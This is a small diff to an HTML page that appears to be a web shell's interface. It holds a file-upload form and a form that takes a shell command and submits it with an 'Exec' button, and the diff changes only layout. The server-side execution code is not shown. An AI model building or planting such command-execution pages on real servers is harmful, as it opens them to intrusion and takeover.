@@ -3,17 +3,16 @@
 <body>
 
 <form action="" method="POST" enctype="multipart/form-data">
-    File:
-    <input type="file" name="fileToUpload">
-    <input type="submit" value="Upload" name="upload">
+	<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
+	<p> File: <input type="file" name="fileToUpload">
+    	<input type="submit" value="Upload" name="upload">
 </form>
 	
 <br>
 	
 <form method="GET">
-    CMD:
-    <input type="text" name="command">
-    <input type="submit" value="Exec" name="cmd">
+	<p>CMD: <input type="text" name="command">
+    	<input type="submit" value="Exec" name="cmd">
 </form>
 
 <pre>
